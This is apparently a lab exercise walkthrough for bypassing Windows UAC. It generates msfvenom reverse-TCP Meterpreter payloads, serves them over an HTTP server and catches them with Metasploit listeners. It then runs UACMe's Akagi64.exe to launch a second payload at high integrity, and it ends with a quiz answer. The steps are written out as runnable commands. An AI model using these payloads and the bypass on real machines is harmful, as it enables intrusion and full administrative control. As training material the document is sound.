# Exercise 7 - Bypassing UAC for Privilege Escalation (UACMe)

## Objective

- Gain an initial Meterpreter session on a Windows 10 machine.
- Verify that the session runs with **Medium Integrity** because of User Account Control (UAC).
- Use **Akagi64.exe (UACMe)** to bypass UAC.
- Execute a second payload with elevated privileges.
- Verify that the new session has **High Mandatory Level**.

---

# Workflow

```text
Parrot Security
      │
      ├── Create payload.exe (8888)
      ├── Create payload1.exe (7777)
      ├── Host files using HTTP Server
      │
      ▼
Windows 10
      │
Download payload.exe
      │
Execute payload.exe
      │
      ▼
Meterpreter Session 1
(Medium Integrity)
      │
Upload Akagi64.exe
Upload payload1.exe
      │
      ▼
Run Akagi64.exe
      │
(UAC Bypass)
      │
Launch payload1.exe
      │
      ▼
Meterpreter Session 2
(High Integrity)
```

---

# Step 1 - Become Root

```bash
sudo su
```

Password

```text
toor
```

---

# Step 2 - Create First Payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
lhost=192.168.0.18 \
lport=8888 \
-f exe \
-o payload.exe
```

### Purpose

Creates the **initial Meterpreter payload**.

This payload provides access to the Windows machine but **does not bypass UAC**.

---

# Step 3 - Create Second Payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
lhost=192.168.0.18 \
lport=7777 \
-f exe \
-o payload1.exe
```

### Purpose

This payload will be executed **after UAC bypass**.

It provides an **elevated Meterpreter session**.

---

# Step 4 - Verify Payloads

```bash
ls
```

Expected

```
payload.exe
payload1.exe
```

---

# Step 5 - Host Files

```bash
python -m http.server 8080
```

Windows downloads the payload from

```
http://192.168.0.18:8080
```

---

# Step 6 - Download payload.exe

On Windows

Open

```
http://192.168.0.18:8080
```

Download

```
payload.exe
```

---

# Step 7 - Start Metasploit Listener

```bash
msfconsole
```

```text
use multi/handler
```

```text
use payload/windows/x64/meterpreter/reverse_tcp
```

```text
set lhost 192.168.0.18
```

```text
set lport 8888
```

```text
exploit
```

---

# Step 8 - Execute payload.exe

On Windows

Run

```
payload.exe
```

A Meterpreter session should be opened.

---

# Step 9 - Interact with Session

```text
sessions -i
```

```text
sessions -i 1
```

---

# Step 10 - Load PowerShell

```text
load powershell
```

```text
powershell_shell
```

---

# Step 11 - Verify UAC

```powershell
Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System' | Select-Object EnableLUA
```

Expected

```
EnableLUA

1
```

Meaning

```
1 = UAC Enabled
```

---

# Step 12 - Check ConsentPromptBehaviorAdmin

```powershell
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System | Select-Object ConsentPromptBehaviorAdmin
```

Expected

```
5
```

Meaning

```
Prompt for consent
```

---

# Step 13 - Check Privileges

```powershell
whoami /priv
```

Only limited administrator privileges are available.

---

# Step 14 - Check Integrity Level

```powershell
whoami /groups
```

Expected

```
Medium Mandatory Level
```

### Explanation

Although the user is an Administrator,

UAC prevents programs from running with full administrator privileges.

Therefore,

```
payload.exe

↓

Medium Integrity
```

---

# Step 15 - Exit PowerShell

```
Ctrl + C
```

---

# Step 16 - Upload Akagi64.exe

```text
upload /home/pentester/Desktop/Akagi64.exe C:\Users\Admin\Downloads
```

---

# Step 17 - Upload Second Payload

```text
upload /home/pentester/Desktop/payload1.exe C:\Users\Admin\Downloads
```

---

# Step 18 - Verify Files

```text
load powershell
```

```text
powershell_shell
```

```powershell
dir
```

Verify

```
Akagi64.exe

payload1.exe
```

---

# Step 19 - Create Second Listener

Open another terminal.

```bash
sudo su
```

```bash
msfconsole
```

```text
use multi/handler
```

```text
set payload windows/x64/meterpreter/reverse_tcp
```

```text
set lhost 192.168.0.18
```

```text
set lport 7777
```

```text
exploit
```

---

# Step 20 - Execute Akagi64

Return to the first Meterpreter session.

Run

```text
./Akagi64.exe 23 "C:\Users\Admin\Downloads\payload1.exe"
```

### What Happens?

```
Akagi64.exe

↓

Exploits AutoElevate

↓

Bypasses UAC

↓

Runs payload1.exe

↓

Administrator privileges
```

---

# Step 21 - New Meterpreter Session

The second listener receives a new connection.

This is the elevated session.

---

# Step 22 - Verify Elevated Privileges

```text
load powershell
```

```text
powershell_shell
```

---

# Step 23 - Check Privileges

```powershell
whoami /priv
```

More privileges are available than before.

---

# Step 24 - Verify Integrity Level

```powershell
whoami /groups
```

Expected

```
High Mandatory Level
```

---

# Understanding the Entire Lab

## Initial Payload

```
payload.exe

↓

Meterpreter

↓

Medium Integrity
```

Reason

UAC is enabled.

---

## UAC Bypass

```
Akagi64.exe

↓

Uses AutoElevate

↓

Runs payload1.exe
```

---

## Final Payload

```
payload1.exe

↓

New Meterpreter Session

↓

High Integrity
```

---

# Why Two Payloads?

The first payload is already running with Medium Integrity.

Windows **cannot automatically upgrade an already-running process** from Medium to High.

Instead,

Akagi64 launches a **new process** (`payload1.exe`) with elevated privileges.

That new process connects back to Metasploit, creating a **second Meterpreter session** with High Integrity.

---

# Medium vs High Integrity

| Medium Integrity | High Integrity |
|------------------|---------------|
| Standard administrator token | Elevated administrator token |
| Restricted by UAC | UAC bypassed |
| Limited privileges | More administrative privileges |
| Initial Meterpreter | Elevated Meterpreter |

---

# Important Commands

### Generate Payloads

```bash
msfvenom ...
```

### Start Listener

```text
use multi/handler
```

### Load PowerShell

```text
load powershell
```

### Check UAC

```powershell
Get-ItemProperty ... EnableLUA
```

### Check Integrity

```powershell
whoami /groups
```

### Upload Files

```text
upload ...
```

### Execute UAC Bypass

```text
./Akagi64.exe 23 "payload1.exe"
```

---

# Final Answer (Question 8.7.1)

**Question:**

Determine the mandatory integrity level after bypassing UAC.

**Answer:**

```
High Mandatory Level
```

Verification command

```powershell
whoami /groups
```

Expected output

```
Mandatory Label

High Mandatory Level
```

---

# Key Takeaway

```
payload.exe
        │
        ▼
Medium Integrity
        │
        ▼
Akagi64.exe
(UAC Bypass)
        │
        ▼
payload1.exe
        │
        ▼
High Integrity
```

**Note:** UAC bypass elevates the process from **Medium Integrity** to **High Integrity (elevated Administrator)**. It does **not** automatically grant **SYSTEM** privileges.
